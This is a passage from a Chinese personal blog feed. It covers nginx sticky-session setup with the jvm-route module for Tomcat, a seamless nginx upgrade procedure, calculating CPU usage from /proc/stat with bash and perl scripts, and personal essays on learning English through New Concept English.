      <content type="html"><![CDATA[<p>1–安装nginx-0.7.65<br>1-0 下载包<br>jvm-route安装包下载命令：<br>svn checkout <a href="http://nginx-upstream-jvm-route.googlecode.com/svn/trunk/" target="_blank" rel="noopener">http://nginx-upstream-jvm-route.googlecode.com/svn/trunk/</a> nginx-upstream-jvm-route-read-only</p><p>nginx当前稳定版下载路径<br>wget  <a href="http://nginx.org/download/nginx-0.7.65.tar.gz" target="_blank" rel="noopener">http://nginx.org/download/nginx-0.7.65.tar.gz</a></p><p>1-1 解压缩 nginx-0.7.65.tar.gz 到 /usr/develop/yagnwr<br>1-2 解压缩 jvm-route.zip 到/usr/develop/yagnwr<br> 还可以从 网站上下载svn checkout <a href="http://nginx-upstream-jvm-route.googlecode.com/svn/trunk/" target="_blank" rel="noopener">http://nginx-upstream-jvm-route.googlecode.com/svn/trunk/</a> nginx-upstream-jvm-route-read-only<br>1-3 切换到 /usr/develop/yagnwr/nginx-0.7.65<br>1-4 patch -p0 &lt; /usr/develop/yagnwr/jvm-route/jvm_route.patch<br>1-5 ./configure –prefix=/usr/mpsp/nginx-0.7.65  –add-module=/home/yangwr/soft/jvm-route/  –with-http_stub_status_module<br>1-6 make<br>1-7 make install</p><p>2–配置文件<br>rm -f /usr/mpsp/nginx-0.7.65/nginx.conf<br>vi /usr/mpsp/nginx-0.7.65/nginx.conf</p><p>3–修改nginx.conf–针对tomcat<br> 服务器10.110.5.151上的nginx.conf负载做如下配置<br> upstream newjboss {  </p><pre><code>   #ip_hash;     server 10.110.5.151:9081    srun_id=a;     server 10.110.5.152:9081     srun_id=b;     jvm\_route $cookie\_JSESSIONID|sessionid reverse;  }  </code></pre><p>  4–修改tomcat配置/tomcat/conf/server.xml<br>10.110.5.151修改为  </p><engine name="Catalina" defaulthost="localhost" jvmroute="a"><p>10.110.5.152修改为  </p><engine name="Catalina" defaulthost="localhost" jvmroute="b"></engine></engine>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx-upstream-jvm-route插件 </tag>
            
            <tag> 按sessionid转发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于报读NCE课程的小小心得</title>
      <link href="/2011/01/18/a-little-insight-into-the-nce-program/"/>
      <url>/2011/01/18/a-little-insight-into-the-nce-program/</url>
      <content type="html"><![CDATA[<p>本科毕业后，换了几份工作，但是总觉得在这个社会中找不到自己的位置，表面上是在积极地工作，但胸口却藏着一颗迷茫、缺乏自信的心。回忆起中学时光，我是一个多么自信的小伙子，完全是一个闭着眼睛便可以考上大学的优等理科生。因此，我对自己说：我不能再这样的活下去，我必须重新找回那久违的信心！可是那份信心藏在哪儿了呢？我陷入了迷茫。我一直在想：究竟是什么事情让我不再自信呢？这个问题让我失眠了一个星期，到了第八天的早上，我的一个朋友在网上给我发了一个网址，打开一看，是一个英文网站，而也就在意识到这是一个英文网站的瞬间，我的潜意识立即让我回了一条信息“晕！全英文的，要我怎么看啊”。而也就在这一刻，我突然意识到了问题的严重性：我终于找到了失去自信的关键——一股面对英语的畏难情绪！</p><p>所以，就我而言，要重拾信心，就首先得学好英语，而学好英语的关键就是要打好基础。况且，要不就不学，要学就要把它学透学精，于是我选择了辞职，全身心地投入到英语学习中。通过网友的推荐，我决定报读《新概念英语》的课程，由于在此之前，我从未报读过任何一所培训学校，所以选择学校时候也相对比较谨慎。首先，学校要有一定的社会知名度（因为这样，师资才有保证）；第二，性价比高（相对便宜的价钱能上更多的课时）；第三，允许试听（试听后不满意的就可以不再报读，将教育投资风险减到最低）。所以，鉴于这三点，我选择了新东方。</p><p>当我来到了黄花岗校区，把我的英语状况向前台的一名服务人员讲述了后，她建议我报读新概念二册的课程。当时听了后，我的内心有种说不出的难受。我本来是想报读新概念三册课程，因为我自问自己：我无论如何都是一名本科生，怎么还要从新概念二册学起？难道以往那么多年的英语学习都白搭了？我真的不能接受这事实，我的信心受到了打击。从那天晚上开始，连续五天，我都没能睡好觉，我的左脑和右脑一直在互相斗争，但谁也没能说服谁。第六天，我勉强作出了决定：先去试听一下新概念二册课程，然后再作决定。</p><p>2006年8月，我开始了我的新概念二册的旅程。我原以为，这个班几乎是中学生的场所，但随后却惊讶地发现，这个班的绝大部分学员都是和我一样已走出校园的人士，这使我内心产生了一丝的安慰和鼓舞。但是，真正让我下定决心报读二册课程的，是一名叫范琛的老师（他的英文名字是Sam）。上课之前，他在黑板上写了一句话：Attitude decides altitude ! 正是这一句普通得不能再普通的话坚定了我的信念。直到现在，我已经在新东方完成了三个课程，但却不曾缺席任何一节课，就因为他写的一句“Attitude decides altitude”。</p><p>而在新概念二册的学习过程中，我运用的是最笨、最耗费时间的方法：听、背和译。晚上上课，然后第二天白天就在家里通过泛听和精听，把课文都完全听懂了，然后就背下来，日复一日地坚持着，每到周日、周一就把之前所背的课文重新背诵，强迫把课文都印在脑子里，完全不需要考虑如何灵活应用，因为我知道，如果脑子里面没有一定量的文章，根本就不懂得如何灵活应用。二册一共是96课（其中有10篇课文是自学的），课程越往后，学习量就会越大（因为周日、周一需要重新背诵的课文就越多，但却绝不能偷懒，因为前三个单元是打基础的，讲得很详细，到了第四单元的进度就变得很快。如果前三个单元偷懒的话，到了第四单元的课程，就会觉得很难，所以，到了最后一节课时候，班里人数还不足第一节课时候的人数的一半，我觉得就是这个原因）。上完了二册（共36节课）以后，实际上，我的第二册学习还没完成，因为第四单元的课程讲得很快，还未来得及一一背诵，课程就已经结束了，因此有必要上完所有课程后，继续把没背诵的课文都背诵了，然后便开始中译英练习。看着每篇课文的中文，按自己的想法译成英文（这时候的我已经掌握了比较多的句型，已经可以从容地把简单句型改为复合句型了），再之后便挑选一些优美的课文进行英译中训练。当经过了这一段的二册学习后，我发觉听、说、读、写能力都有了质的飞跃，这种飞跃并不是一言两语就能表述清楚的，也只有学透了二册的学员，才可能领会这般的感悟。</p><p>2006年11月中旬，我便真正地进入了三册的课程学习。三册课程的起点要比二册高很多，老师也是全英文授课的，但由于我学透了二册后，才报读三册课程，于是我很快就适应了，而且我也暗暗庆幸一开始选择了报读新概念二册。如果我一开始就固执己见地报读三册的话，换来的肯定是对自我信心的成倍重挫，甚至作出一辈子远离英语的决定。在三册的学习中，我沿用了学习二册的方法。虽然三册的课文无论是篇幅还是难度都有很大程度的提升，但由于已经学透了二册，所以背诵起来并不觉得困难。</p><p>过完年以后，我报读了口语二级班，或许很多人感到不解，为什么背完新概念二册、三册后，还要去学习口语二级？因为我认为，口语和书面语的着重点不同，口语是生活化的，并非一味地提高难度，就能操一口生动的口语，所以，根据自身的情况，我决定从口语二级学起。就我而言，有了新概念英语打下的扎实基础，学习口语时候，我把精力更多的放在学习口语技巧，以及掌握西方人的思维模式，并且每天都坚持看《新英语900句》的VCD和一部英文电影，并且用英文复述《新英语900句》每一个小故事和电影的情节。这样，到了口语二级课程结束时，我的英语口语水平已经有了很大的提升。</p><p>此后，我面试了一家外企，并成功拿到了offer。</p><p>当然，并非每个人都得依照我的学习心得去提升英语水平，每个人所走的历程必然不同，我只是与大家分享一下自身的学习心得罢了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概念 </tag>
            
            <tag> 英语 </tag>
            
            <tag> 课文 </tag>
            
            <tag> 课程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写错都不错，学习下</title>
      <link href="/2011/01/18/bad-writing-is-good-learn-it/"/>
      <url>/2011/01/18/bad-writing-is-good-learn-it/</url>
      <content type="html"><![CDATA[<p>一个满腹怨气的人没有人会喜欢。就算你真的受尽委屈，那也是你在成长的过程中经历的经验和教训。有的时候，隐忍不是忍气吞声，而是为了藏拙和藏锋。</p><p>当你走到最顶峰的时候，你会认为自己已经没有敌人了。那么请你小心，你最大的敌人即将出现，他就是你自己。这个世界上没有比自己更强大的敌人，他门拥有和你一样的才华一样的头脑一样的身材，但是我相信他门比你更了解你自己，战胜自己才是我门最后的目标。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 我相信 </tag>
            
            <tag> 敌人 </tag>
            
            <tag> 藏拙 </tag>
            
            <tag> 藏锋 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>(转)谈谈背诵新概念英语第四册历程</title>
      <link href="/2011/01/12/turn-talk-about-reciting-the-fourth-book-of-new-concept-english/"/>
      <url>/2011/01/12/turn-talk-about-reciting-the-fourth-book-of-new-concept-english/</url>
      <content type="html"><![CDATA[<p>看到大家那么热烈地讨论背诵新概念，不禁有一点凑凑热闹的冲动。</p><p>　　我本人学习英语新概念四已经有很多年了，从1997年把老版本的NC4作为阅读材料，到1999年5月决心背诵它，直到2004年才真正意义上的将NC4背熟（能把新版本48篇文章连续串背两个多小时背完，基本不出现大的错误）。历时有7，8年的光景。期间经历了多少的探索，苦闷辛酸，兴奋，激情，迷狂，淡泊，总之学习新概念的过程也是我对学习英语一个探索思考的过程进而也是我的对自我教育乃至整个人生一种感受至深、启我思考的体验。背诵新概念 4给我的一点点看得到得回报是，我的4、6级考试都是在没有专门进行考前训练的情况下考出了比较好的成绩，4级94，6级92分。研究生英语考试88分（用背NC4的方法，选背了朱泰祺老先生的考研复习指南，作过少量的真题）。真正的回报却远不止于此。由于时间关系，我不能谈得很详细，只能很简单地谈谈我背NC4的一点点历程。</p><p>　　1、最开始，1999年5月－8月。大跃进似的激情——打算三个月搞定NC4。实际上三个月过去了，真正背过的文章也只有10多篇，而随时能脱口而出的就仅有2、3篇了。大多背过的文章，都是模模糊糊不知所云了。那段时间具体投入的时间是很集中的，用的是李阳的方法，记得当时很多天晚上梦话都是背的英文，怎么效果会如此差呢？感觉打击太大。</p><p>　　2、1999－2001年，彷徨、怀疑的阶段。尝试了很多其他的方法，但学习焦点自问并没有聚在NC4上。也还在背NC4，但是，陷入了背了忘，忘了又背，背了后面忘了前面的怪圈。能够勉勉强强背下10多课，能随时脱口而出的仅有5，6篇。只有安慰自己，因为是工科学生，并没有太多时间花在英语上。</p><p>　　3、2002年，充满转机的一年。这年的寒假，即2002年2月我没回家在北京新东方学校学习GRE，说实在的GRE培训让我多多少少对新东方有些失望，但是在寒假的系列讲座却对我很有影响。第一，我发现江博在讲座中引背新概念四的几段还没有我背得熟，背得标准。对自己背新概念又有了些许的信心。第二，杜子华老师演讲时，讲了学英语的几大原则。对我很有启发，觉得背新概念四也需要以兴趣引导顺序。第三，俞敏洪演讲中提到的学习英语初期就是“精深远大于博大”。让我不得不反思，我在背NC4中是不是真正做到了。另外，北外的熊德兰教授，让我知道“课文”的真正涵义。钟道隆老师让我知道习惯的力量，还有听写是一种最不易疲劳的综合学习。（这里都不作展开讲）仔细研究NC4，发现内容也并不多，不过750句。按李阳的比较机械的方法，一天2句话一年也就搞定了。何况，每篇文章都是一个和谐统一的整体，逻辑结构都很严谨，文字又是琅琅上口，优美异常，相当多的文章还和现实生活息息相关，更易于记忆。经过一番思考，决定再下决心背诵NC4。并且规定自己，在这个较长的阶段学习英语就是简单的一件——背诵NC4,学习英语＝背诵NC4＋大量泛读自己想获得信息的英文资料。目标明确了，给自己一个最低的标准，即每天最少2句NC4的句子。</p><p>　　4、2003－2004年，完善方法的阶段。一位在新东方兼职作老师的同学与我聊到新概念四，我给他背了几课，觉得我确实比较熟。突然，他叫我把背过的文章一句一句翻译成中文，并讲解一番。我立马伸嘴结舌。每一句的意思都无比清楚，但是用中文恰如其分地翻译确实有很大问题。这时候，我才深切地体会到，学习NC4重在文化理解与文字翻译上。于是，在背诵的同时，仔细品味译文翻译，进行英汉快速互译，并且举一反三进行造句或者复述，再把它们用在日常生活中就变成我消化背诵的主要方法了（当然，这时我开始背诵中文译文了）。有趣的是，最终得出结论——“当教新概念四的英语老师”是促进你学习及活背NC4的最好方法。从这一点讲，“在新东方得到最大培养和提高的主要是教师而非学生”，这种评价我是深以为然的。又一次，新东方学员的新概念班结课时有一个背诵大赛，我碰巧观摩了一下，我发现能连续背诵5课以上的学员几乎没有。我自己试了试，也就能连续选背最熟的文章10多篇，其他的或多或需要复习一些时间。于是，开始了连续5课串背的训练。这样在2004年的10月终于有了连续串背整本书的成绩。死记是伴随着活用的，这样死记才会记的牢、记得有生命。活用没有死记，总归是无源之水，无根之木。如果没有那个“一”，又谈何举一反三，闻一而知十，一通百通，万法归一呢？广阔的生活空间就是你活用的场所是你体验的场所。在没有语言环境的情况下学习外语，“先死后活 ”的方法无疑是比较可行的“捷径”。</p><p>　　5、现在，背诵NC4已经不是最初所认识的那种——一个快捷的学习方法，已经切切实实成了我的一种生活方式。每天晚上是在背诵NC4的过程中昏昏入睡，起床时是在背诵NC4的激情中度过。在看落日时会情不自禁背诵“beauty”，当不得不面临必须要做的事情时对自己背一段“hobby”、“how to grow old”。在无数等车，坐车，闲暇的零碎时间，我可以根据自己的喜好选背一段NC4的文章。其实，时间已经过去7、8年了，也谈不上是什么快捷了。但一切都慢慢变得自然，变得没有刻意和偏执（让我又不得不想到11课）。并且我知道我这一生都会不断地背诵它、咀嚼它、品味它。学习英文的高一点的境界应该是，英文如同空气与水，你根本意识不到它的存在，但你无时无刻不在使用它，用它传递思想、情感、知识信息。并且使用的熟练程度和习惯与母语没有多大的区别。我们在这种环境中吗？我们在主动营造这种环境并尝试成为自己的生活方式吗？<br>　　现在想一想，有言道“读书先需识字”，NC4不过是碰巧成为那部英文识字书罢了。真正的读书道路还很长很长。建议听录音选择英版的，在你买《新概念》时配套的磁带就是英版，而且这是经典录音。我听的是美版的，但个人认为英版的好。除非你想学美式发音。<br>　　对于《新概念》的学习，首先要告诉你的是一定要下苦功夫，不能嫌烦，坚持下去。而且要从第一册开始学起，这样对于你以后的学习会有好处的。相对来说，第一册简单一些，基本上是一些日常对话，或者简单的叙述性短文。别看简单，如果你能脱口而出的话，就已经相当了不起了，而且，对于第二、三、四册的改写范文，能够打下坚实的基础。<br>　　背诵二、三、四册全文，理解性的去记忆，无须一字不落，你学英文的目的是为了能够表达思想，而不是单纯的背诵。机械式的背诵只能让你打击自信，失败得更快。要理解性的去背诵，当明白课文的意思时，就要学会去改写它，把范文中所有的文章改写为自己的事情，让自己成为第一人，而不是一个阅读者。这样，你的记忆才能深刻，才能积累语言，迅速的表达思想。书后的练习一定要做，同样也是改写成自己的事情，虚拟一个自己从未做过的事情也可以。只有理解性的 记忆才是自己真实拥有的，别“傻背”。<br>　　磁带要天天听，早、中、晚，各一次。就像你听流行歌曲一样，听多了，记忆自然就深刻了。刚开始，要逐词逐句的听，听出来的要默写出来，不要看书。利用词典去查每个单词的音标、注解。自己写出中文解释，不要看书。最后都写出来了，再和书上对照。准确无误后，就去跟随录音大声的朗读，直到语气、发音和录音相同为止。要保证听完的磁带每隔5－7天就重新听一遍。边听边跟着说。<br>　　每天不要过多的记忆，有5句话足以，多了什么也记不住，不要去考虑进度，当你对英语有了感觉后，速度是突飞猛进的。心不要太急，戒骄戒躁，就像一个人猛吸一口气，他可以跑得很快，但他永远跑不远。就是这个道理。<br>　　再背书时，每次都把要被的内容写出来，再和原书去对照，拿着你默写的去背。你的书翻得越少越好！磁带越多听越好。<br>　　不要平凡更换教材，如果你下决心学《新概念》了，就把它学到底。用不着4册都学完的时候，你就已经能够轻松阅读英文原著了。<br>　　平时还要多注意创造语言环境，只要有英文的就看，是英文的就听。这样量变才能达到质变。<br>　　开口说很重要，有朋友一起练更好，没有的话就自己唠叨，自己和自己对话。扮演书中的角色。<br>　　我在天涯里已经回复过很多怎么学英文的帖子了，你自己找找看，也许对你有所启示。要尽快总结一套适合自己学习的方法，这样才能更好地坚持学英文。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 谈谈背诵新概念英语第四册历程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>无缝升级nginx版本</title>
      <link href="/2011/01/08/seamlessly-upgrade-nginx-version/"/>
      <url>/2011/01/08/seamlessly-upgrade-nginx-version/</url>
      <content type="html"><![CDATA[<p># cd /usr/local/nginx/<br># sbin/nginx -V #查看版本<br>[root@vps nginx]# sbin/nginx -V<br>nginx version: nginx/0.7.65<br>built by gcc 4.1.2 20080704 (Red Hat 4.1.2-48)<br>TLS SNI support disabled<br>configure arguments: –user=www –group=www –prefix=/usr/local/nginx –with-http_stub_status_module –with-http_ssl_module  //注意这里的编译项<br># cd  </p><p>#wget <a href="http://www.nginx.org/download/nginx-0.8.53.tar.gz" target="_blank" rel="noopener">http://www.nginx.org/download/nginx-0.8.53.tar.gz</a>  </p><p>#tar zxvf nginx-0.8.53.tar.gz  </p><p>#cd nginx-0.8.53  </p><p>#./configure –user=www –group=www –prefix=/usr/local/nginx –with-http_stub_status_module –with-http_ssl_module  //按原来的选项configure  </p><p>#make    //注意只make  不要make install  </p><p>#mv /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.old  </p><p>#cd objs/  </p><p>#cp nginx /usr/local/nginx/sbin/  </p><p>#/usr/local/nginx/sbin/nginx -t  </p><p>#kill -USR2 `cat /usr/local/nginx/logs/nginx.pid`  </p><p>#kill -QUIT `cat /usr/local/nginx/logs/nginx.pid.oldbin`  </p><p>#/usr/local/nginx/sbin/nginx -v  </p><p>#cd ..  </p><p>#cd ..  </p><p>#rm -rf nginx-0.8.53  </p><p>#rm -rf nginx-0.8.53.tar.gz<br>最后重启nginx</p><p>或</p><p>一 重新安装下pcre</p><p>[root@datacenter sbin]# cd /home/php</p><p>[root@datacenter php]# tar xzvf  pcre-8.02.tar.gz</p><p>[root@datacenter php]# cd pcre-8.02</p><p>[root@datacenter pcre-8.02]# ./configure</p><p>[root@datacenter pcre-8.02]# make &amp;&amp; make install</p><p>[root@datacenter pcre-8.02]# cd ..</p><p>[root@datacenter php]# tar xzvf  nginx-0.8.37.tar.gz<br>[root@datacenter php]# cd nginx-0.8.37</p><p>[root@datacenter nginx-0.8.37]#./configure –prefix=/home/php/nginx –with-http_stub_status_module –with-pcre=/home/php/pcre-8.02 #查看nginx版本的时候直接复制configure arguments项</p><p>[root@datacenter nginx-0.8.37]# make</p><p>[root@datacenter nginx-0.8.37]# mv /home/php/nginx/sbin/nginx /home/php/nginx/sbin/nginx.old</p><p>[root@datacenter nginx-0.8.37]# cp objs/nginx /home/php/nginx/sbin</p><p>[root@datacenter nginx-0.8.37]# make upgrade</p><p>[root@datacenter nginx-0.8.37]# cd ../nginx/sbin</p><p>[root@datacenter nginx-0.8.37]# nginx -V</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx版本无缝升级 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux下/proc/stat 计算CPU利用率</title>
      <link href="/2011/01/07/linux-proc-stat-calculates-cpu-utilization/"/>
      <url>/2011/01/07/linux-proc-stat-calculates-cpu-utilization/</url>
      <content type="html"><![CDATA[<p>一般来说对于需要大量cpu计算的进程，当前端压力越大时，CPU利用率越高。但对于I/O网络密集型的进程，即使请求很多，服务器的CPU也不一定很到，这时的服务瓶颈一般是在磁盘的I/O上。比较长见的就是，大文件频繁读写的cpu开销远小于小文件频繁读写的开销。因为在I/O吞吐量一定时，小文件的读写更加频繁，需要更多的cpu来处理I/O的中断。<br>在Linux/Unix下，CPU利用率分为用户态，系统态和空闲态，分别表示CPU处于用户态执行的时间，系统内核执行的时间，和空闲系统进程执行的时间。平时所说的CPU利用率是指：CPU执行非系统空闲进程的时间 / CPU总的执行时间。<br>在Linux的内核中，有一个全局变量：Jiffies。 Jiffies代表时间。它的单位随硬件平台的不同而不同。系统里定义了一个常数HZ，代表每秒种最小时间间隔的数目。这样jiffies的单位就是1/HZ。Intel平台jiffies的单位是1/100秒，这就是系统所能分辨的最小时间间隔了。每个CPU时间片，Jiffies都要加1。 CPU的利用率就是用执行用户态+系统态的Jiffies除以总的Jifffies来表示。<br>在Linux系统中，可以用/proc/stat文件来计算cpu的利用率(详细的解释可参考：<a href="http://www.linuxhowtos.org/System/procstat.htm" target="_blank" rel="noopener">http://www.linuxhowtos.org/System/procstat.htm</a>)。这个文件包含了所有CPU活动的信息，该文件中的所有值都是从系统启动开始累计到当前时刻。<br>如：  </p><p>[sailorhzr@builder ~]$ cat /proc/stat<br>cpu 432661 13295 86656 422145968 171474 233 5346<br>cpu0 123075 2462 23494 105543694 16586 0 4615<br>cpu1 111917 4124 23858 105503820 69697 123 371<br>cpu2 103164 3554 21530 105521167 64032 106 334<br>cpu3 94504 3153 17772 105577285 21158 4 24<br>intr 1065711094 1057275779 92 0 6 6 0 4 0 3527 0 0 0 70 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 7376958 0 0 0 0 0 0 0 1054602 0 0 0 0 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0<br>ctxt 19067887<br>btime 1139187531<br>processes 270014<br>procs_running 1<br>procs_blocked 0</p><p>输出解释<br>CPU 以及CPU0、CPU1、CPU2、CPU3每行的每个参数意思（以第一行为例）为：<br>参数 解释<br>user (432661) 从系统启动开始累计到当前时刻，用户态的CPU时间（单位：jiffies） ，不包含 nice值为负进程。1jiffies=0.01秒<br>nice (13295) 从系统启动开始累计到当前时刻，nice值为负的进程所占用的CPU时间（单位：jiffies）<br>system (86656) 从系统启动开始累计到当前时刻，核心时间（单位：jiffies）<br>idle (422145968) 从系统启动开始累计到当前时刻，除硬盘IO等待时间以外其它等待时间（单位：jiffies）<br>iowait (171474) 从系统启动开始累计到当前时刻，硬盘IO等待时间（单位：jiffies） ，<br>irq (233) 从系统启动开始累计到当前时刻，硬中断时间（单位：jiffies）<br>softirq (5346) 从系统启动开始累计到当前时刻，软中断时间（单位：jiffies）<br>CPU时间=user+system+nice+idle+iowait+irq+softirq<br>“intr”这行给出中断的信息，第一个为自系统启动以来，发生的所有的中断的次数；然后每个数对应一个特定的中断自系统启动以来所发生的次数。<br>“ctxt”给出了自系统启动以来CPU发生的上下文交换的次数。<br>“btime”给出了从系统启动到现在为止的时间，单位为秒。<br>“processes (total_forks) 自系统启动以来所创建的任务的个数目。<br>“procs_running”：当前运行队列的任务的数目。<br>“procs_blocked”：当前被阻塞的任务的数目。<br>那么CPU利用率可以使用以下两个方法。先取两个采样点，然后计算其差值：  </p><p>cpu usage=(idle2-idle1)/(cpu2-cpu1)<em>100<br>cpu usage=[(user_2 +sys_2+nice_2) - (user_1 + sys_1+nice_1)]/(total_2 - total_1)</em>100</p><p>以下用分别用bash和perl做的一个cpu利用率的计算：<br>本人注:以下代码则采用公式为:  </p><p>total_0USER[0]+NICE[0]+SYSTEM[0]+IDLE[0]+IOWAIT[0]+IRQ[0]+SOFTIRQ[0]<br>total_1=USER[1]+NICE[1]+SYSTEM[1]+IDLE[1]+IOWAIT[1]+IRQ[1]+SOFTIRQ[1]<br>cpu usage=(IDLE[0]-IDLE[1]) / (total_0-total_1) * 100</p><p>###bash 代码(本人提供.可用)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh  </span><br><span class="line">##echo user nice system idle iowait irq softirq  </span><br><span class="line">CPULOG_1=$(cat /proc/stat | grep &apos;cpu &apos; | awk &apos;&#123;print $2&quot; &quot;$3&quot; &quot;$4&quot; &quot;$5&quot; &quot;$6&quot; &quot;$7&quot; &quot;$8&#125;&apos;)  </span><br><span class="line">SYS\_IDLE\_1=$(echo $CPULOG_1 | awk &apos;&#123;print $4&#125;&apos;)  </span><br><span class="line">Total\_1=$(echo $CPULOG\_1 | awk &apos;&#123;print $1+$2+$3+$4+$5+$6+$7&#125;&apos;)  </span><br><span class="line">sleep 5  </span><br><span class="line">CPULOG_2=$(cat /proc/stat | grep &apos;cpu &apos; | awk &apos;&#123;print $2&quot; &quot;$3&quot; &quot;$4&quot; &quot;$5&quot; &quot;$6&quot; &quot;$7&quot; &quot;$8&#125;&apos;)  </span><br><span class="line">SYS\_IDLE\_2=$(echo $CPULOG_2 | awk &apos;&#123;print $4&#125;&apos;)  </span><br><span class="line">Total\_2=$(echo $CPULOG\_2 | awk &apos;&#123;print $1+$2+$3+$4+$5+$6+$7&#125;&apos;)  </span><br><span class="line">SYS\_IDLE=\`expr $SYS\_IDLE\_2 - $SYS\_IDLE_1\`  </span><br><span class="line">Total=\`expr $Total\_2 - $Total\_1\`  </span><br><span class="line">SYS\_USAGE=\`expr $SYS\_IDLE/$Total*100 |bc -l\`  </span><br><span class="line">SYS\_Rate=\`expr 100-$SYS\_USAGE |bc -l\`  </span><br><span class="line">Disp\_SYS\_Rate=\`expr &quot;scale=3; $SYS_Rate/1&quot; |bc\`  </span><br><span class="line">echo $Disp\_SYS\_Rate%</span><br></pre></td></tr></table></figure><p>###perl 代码(网友提供.可用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl  </span><br><span class="line">use warnings;  </span><br><span class="line">$SLEEPTIME=5;  </span><br><span class="line">if (-e &quot;/tmp/stat&quot;) &#123;  </span><br><span class="line">unlink &quot;/tmp/stat&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">open (JIFF_TMP, &quot;&gt;&gt;/tmp/stat&quot;) || die &quot;Can&apos;t open /proc/stat file!\\n&quot;;  </span><br><span class="line">open (JIFF, &quot;/proc/stat&quot;) || die &quot;Can&apos;t open /proc/stat file!\\n&quot;;  </span><br><span class="line">@jiff_0=&lt;JIFF&gt;;  </span><br><span class="line">print JIFF\_TMP $jiff\_0[0] ;  </span><br><span class="line">close (JIFF);  </span><br><span class="line">sleep $SLEEPTIME;  </span><br><span class="line">open (JIFF, &quot;/proc/stat&quot;) || die &quot;Can&apos;t open /proc/stat file!\\n&quot;;  </span><br><span class="line">@jiff_1=&lt;JIFF&gt;;  </span><br><span class="line">print JIFF\_TMP $jiff\_1[0];  </span><br><span class="line">close (JIFF);  </span><br><span class="line">close (JIFF_TMP);  </span><br><span class="line">@USER=\`awk &apos;&#123;print \\$2&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@NICE=\`awk &apos;&#123;print \\$3&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@SYSTEM=\`awk &apos;&#123;print \\$4&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@IDLE=\`awk &apos;&#123;print \\$5&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@IOWAIT=\`awk &apos;&#123;print \\$6&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@IRQ=\`awk &apos;&#123;print \\$7&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">@SOFTIRQ=\`awk &apos;&#123;print \\$8&#125;&apos; &quot;/tmp/stat&quot;\`;  </span><br><span class="line">$JIFF_0=$USER[0]+$NICE[0]+$SYSTEM[0]+$IDLE[0]+$IOWAIT[0]+$IRQ[0]+$SOFTIRQ[0];  </span><br><span class="line">$JIFF_1=$USER[1]+$NICE[1]+$SYSTEM[1]+$IDLE[1]+$IOWAIT[1]+$IRQ[1]+$SOFTIRQ[1];  </span><br><span class="line">$SYS\_IDLE=($IDLE[0]-$IDLE[1]) / ($JIFF\_0-$JIFF_1) * 100;  </span><br><span class="line">$SYS\_USAGE=100 - $SYS\_IDLE;  </span><br><span class="line">printf (&quot;The CPU usage is %1.2f%%\\n&quot;,$SYS_USAGE);</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux下/proc/stat </tag>
            
            <tag> 计算cpu利用率 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>/proc/[pid]/stat 文件解释</title>
      <link href="/2011/01/07/proc-pid-stat-file-explain/"/>
      <url>/2011/01/07/proc-pid-stat-file-explain/</url>
